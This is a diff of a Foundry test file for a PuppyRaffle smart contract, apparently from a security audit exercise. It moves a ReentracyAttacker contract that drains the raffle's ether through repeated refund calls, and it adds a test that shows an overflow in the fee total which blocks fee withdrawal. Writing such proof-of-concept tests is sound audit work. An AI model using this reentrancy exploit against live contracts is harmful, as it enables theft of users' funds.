@@ -5,6 +5,39 @@ pragma experimental ABIEncoderV2;
 import {Test, console} from "forge-std/Test.sol";
 import {PuppyRaffle} from "../src/PuppyRaffle.sol";
 
+contract ReentracyAttacker {
+    PuppyRaffle puppyRaffle;
+    uint256 enteranceFee;
+    uint256 playerIndex;
+
+    constructor(PuppyRaffle _puppyRaffle) {
+        puppyRaffle = _puppyRaffle;
+        enteranceFee = _puppyRaffle.entranceFee();
+    }
+
+    function attack() external payable {
+        address[] memory player = new address[](1);
+        player[0] = address(this);
+        puppyRaffle.enterRaffle{value: enteranceFee}(player);
+        playerIndex = puppyRaffle.getActivePlayerIndex(address(this));
+        puppyRaffle.refund(playerIndex);
+    }
+
+    function _steal() internal {
+        if (address(puppyRaffle).balance >= enteranceFee) {
+            puppyRaffle.refund(playerIndex);
+        }
+    }
+
+    fallback() external payable {
+        _steal();
+    }
+
+    receive() external payable {
+        _steal();
+    }
+}
+
 contract PuppyRaffleTest is Test {
     PuppyRaffle puppyRaffle;
     uint256 entranceFee = 1e18;
@@ -262,37 +295,37 @@ contract PuppyRaffleTest is Test {
         assertEq(endingRaffleBalance, 0);
         assertEq(endingAttackerBalance, (startingAttackerBalance + startingRaffleBalance));
     }
-}
 
-contract ReentracyAttacker {
-    PuppyRaffle puppyRaffle;
-    uint256 enteranceFee;
-    uint256 playerIndex;
+    function testTotalFeesOverflow() public playersEntered {
+        // We finish a raffle of 4 to collect some fees
+        vm.warp(block.timestamp + duration + 1);
+        vm.roll(block.number + 1);
+        puppyRaffle.selectWinner();
+        uint256 startingTotalFees = puppyRaffle.totalFees();
+        // startingTotalFees = 800000000000000000
 
-    constructor(PuppyRaffle _puppyRaffle) {
-        puppyRaffle = _puppyRaffle;
-        enteranceFee = _puppyRaffle.entranceFee();
-    }
-
-    function attack() external payable {
-        address[] memory player = new address[](1);
-        player[0] = address(this);
-        puppyRaffle.enterRaffle{value: enteranceFee}(player);
-        playerIndex = puppyRaffle.getActivePlayerIndex(address(this));
-        puppyRaffle.refund(playerIndex);
-    }
-
-    function _steal() internal {
-        if (address(puppyRaffle).balance >= enteranceFee) {
-            puppyRaffle.refund(playerIndex);
+        // We then have 89 players enter a new raffle
+        uint256 playersNum = 89;
+        address[] memory players = new address[](playersNum);
+        for (uint256 i = 0; i < playersNum; i++) {
+            players[i] = address(i);
         }
-    }
+        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);
+        // We end the raffle
+        vm.warp(block.timestamp + duration + 1);
+        vm.roll(block.number + 1);
 
-    fallback() external payable {
-        _steal();
-    }
+        // And here is where the issue occurs
+        // We will now have fewer fees even though we just finished a second raffle
+        puppyRaffle.selectWinner();
 
-    receive() external payable {
-        _steal();
+        uint256 endingTotalFees = puppyRaffle.totalFees();
+        console.log("ending total fees", endingTotalFees);
+        assert(endingTotalFees < startingTotalFees);
+
+        // We are also unable to withdraw any fees because of the require check
+        vm.prank(puppyRaffle.feeAddress());
+        vm.expectRevert("PuppyRaffle: There are currently players active!");
+        puppyRaffle.withdrawFees();
     }
 }
